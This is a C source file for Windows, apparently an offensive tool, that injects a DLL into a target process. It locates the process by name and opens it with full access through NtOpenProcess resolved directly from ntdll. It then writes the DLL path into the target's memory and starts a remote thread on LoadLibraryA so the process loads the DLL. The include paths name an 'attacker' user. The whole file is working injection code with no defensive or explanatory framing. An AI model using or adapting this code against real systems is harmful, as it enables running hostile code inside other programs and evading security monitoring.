#include <Windows.h>
#include <stdio.h>
#include "C:\Users\attacker\source\hiddenLib-main\info\info.h"
#include "listprocess.h"
#include "grim.h"

#define MAX_SIZE 1024

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("%s %s <ProcessName> <Dll>", ERROR, argv[0]);
		return 1;
	}

	CHAR* cProcessName = argv[1];
	DWORD dwPid;
	HANDLE hProcess = NULL;
	LPCSTR lpDllName = argv[2];
	DWORD dwSize = strlen(lpDllName);
	HMODULE hKernel32 = NULL;
	FARPROC fLoadLibraryAddress = NULL;
	CHAR* cBuffer = NULL;
	HANDLE hThread = NULL;
	SIZE_T sNumberBytesWritten;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL };
	CLIENT_ID ci = { NULL, NULL };

	dwPid = ListProcess(cProcessName);

	HANDLE hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll == NULL) {
		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for NTDLL at address: 0x%p\n", SUCCESS, hNtdll);

	FARPROC fLoadLibraryAddressNtdll;
	fLoadLibraryAddressNtdll = GetProcAddress(hNtdll, "NtOpenProcess");
	if (fLoadLibraryAddressNtdll == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for LoadLibrary NtOpenProcess at: 0x%p\n", SUCCESS, fLoadLibraryAddressNtdll);

	pNtOpenProcess customNtOpenProcess = (pNtOpenProcess)fLoadLibraryAddressNtdll;

	ci.UniqueProcess = dwPid;
	customNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &ci);

	/*
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPid);
	if (hProcess == NULL) {
		printf("%s OpenProcess failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for process %d at address: 0x%p\n", SUCCESS, dwPid, hProcess);
	*/

	hKernel32 = GetModuleHandleA("kernel32");
	if (hKernel32 == NULL) {
		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for KERNEL32 at address: 0x%p\n", SUCCESS, hKernel32);

	fLoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
	if (fLoadLibraryAddress == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for LoadLibrary at: 0x%p\n", SUCCESS, fLoadLibraryAddress);

	cBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (cBuffer == NULL) {
		printf("%s VirtualAllocEx failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Allocated memory at address: 0x%p\n", SUCCESS, cBuffer);

	if (!WriteProcessMemory(hProcess, cBuffer, lpDllName, dwSize, &sNumberBytesWritten)) {
		printf("%s WriteProcessMemory failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Successfully writted %zu bytes in memory at address: 0x%p\n", SUCCESS, sNumberBytesWritten, cBuffer);

	hThread = CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)fLoadLibraryAddress, cBuffer, 0, NULL);
	if (hThread == NULL) {
		printf("%s CreateRemoteThread failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Launched thread at address: 0x%p\n", SUCCESS, hThread);

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}